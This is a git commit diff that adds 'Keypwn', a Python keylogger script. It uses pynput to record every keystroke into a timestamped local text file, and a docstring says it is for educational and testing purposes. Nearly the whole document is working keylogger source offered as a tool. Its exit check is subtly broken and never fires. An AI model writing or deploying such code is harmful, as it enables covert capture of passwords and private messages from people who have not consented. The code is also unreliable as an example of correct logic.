09df6372be30f281f56f6a45326b5b4d91a3bef7
Its-yayo <a01754574@tec.mx>
2023-05-17 16:35:06 -0600

    Add changes fix module

--- src/keypwn.py
+++ src/keypwn.py
@@ -1,4 +1,47 @@
+""" 
+    Keypwn is a single keylogger tool to capture keystrokes and stores it locally. For
+    educational and testing purposes only.
+
+    Developed by @Its-Yayo. Follow me fellas!
+
 """
 
+import os
+import sys
+import datetime
+from pynput.keyboard import Listener
 
-"""
+date = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+log_name = open(f'keypwn_{date}.txt', 'w+')
+
+os.system('cls')
+
+def keypwn(key):
+    global keys, log_name
+
+    keys = str(key).replace("'", "")
+
+    if keys == "'\\x03'":
+        log_name.close()
+        sys.exit()
+    
+    if keys == 'Key.enter':
+        log_name.write('\n')
+    elif keys == 'Key.space':
+        log_name.write(' ')
+    elif keys == 'Key.backspace':
+        log_name.write(' [Backspace] ')
+    else:
+        log_name.write(keys.replace("'", ""))
+    
+with Listener(on_press=keypwn) as listener:
+    listener.join()
+
+
+
+    
+    
+
+
+
+
